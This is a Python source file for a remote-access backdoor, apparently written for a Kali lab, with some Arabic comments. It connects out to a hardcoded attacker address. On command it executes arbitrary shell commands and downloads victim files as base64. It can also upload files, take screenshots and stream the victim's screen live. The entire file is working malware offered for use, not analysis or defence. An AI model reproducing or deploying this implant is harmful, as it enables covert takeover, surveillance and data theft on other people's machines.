import socket
import subprocess
import json
import os
import base64
import mss
import time

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.sct = mss.mss()
        self.streaming = False

    def safe_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def safe_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def send_binary(self, data):
        try:
            data_size = len(data)
            print(f"[Debug] Frame size before sending: {data_size} bytes")
            if data_size > 10_000_000:  # حد أقصى 10 MB
                print(f"[Debug] Warning: Frame size {data_size} bytes is too large, skipping")
                return
            if data_size == 0:
                print("[Debug] Warning: Frame size is 0, skipping")
                return
            self.connection.send(data_size.to_bytes(4, byteorder='big'))
            self.connection.sendall(data)
            print(f"[Debug] Sent frame of size: {data_size} bytes")
        except Exception as e:
            print(f"[Debug] Send error: {str(e)}")

    def change_path(self, path):
        os.chdir(path)
        return f"[+] Changing path to {path}"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run_system_commands(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()

    def capture_screenshot(self):
        screenshot = self.sct.shot(output="temp.png")
        with open("temp.png", "rb") as file:
            screenshot_data = base64.b64encode(file.read()).decode()
        os.remove("temp.png")
        return screenshot_data

    def stream_screen(self):
        self.streaming = True
        self.safe_send("[+] Screen streaming started")
        while self.streaming:
            # استخدام mss لالتقاط وحفظ الصورة مباشرة كـ PNG
            try:
                temp_file = "temp_stream.png"
                self.sct.shot(output=temp_file, mon=1)  # التقاط الشاشة الأولى
                with open(temp_file, "rb") as f:
                    frame_data = f.read()
                os.remove(temp_file)
                print(f"[Debug] Raw frame size from mss: {len(frame_data)} bytes")
            except Exception as e:
                print(f"[Debug] Error capturing frame: {str(e)}")
                continue
            self.send_binary(frame_data)
            time.sleep(0.2)
            self.connection.settimeout(0.1)
            try:
                command = self.safe_receive()
                if command[0] == "stop":
                    self.streaming = False
                    self.safe_send("STOP")
                    break
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[Debug] Stream error: {str(e)}")
                break

    def show_help(self):
        return """
Available Commands:
  help         - Show this help message
  exit         - Close the connection and exit
  upload <file> - Upload a file to the target
  download <file> - Download a file from the target
  screenshot   - Capture a screenshot from the target
  stream       - Start live screen streaming (type 'stop' to end)
  stop         - Stop the live screen streaming
  cd <path>    - Change directory on the target
  <any shell command> - Execute a system command
        """

    def run(self):
        while True:
            try:
                command = self.safe_receive()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_path(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "screenshot":
                    command_result = self.capture_screenshot()
                elif command[0] == "stream":
                    self.stream_screen()
                    continue
                elif command[0] == "help":
                    command_result = self.show_help()
                else:
                    command_result = self.run_system_commands(command)
                self.safe_send(command_result)
            except Exception as e:
                self.safe_send(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    my_backdoor = Backdoor("192.168.1.8", 5555)  # استبدل بـ IP الخاص بـ Kali
    my_backdoor.run()
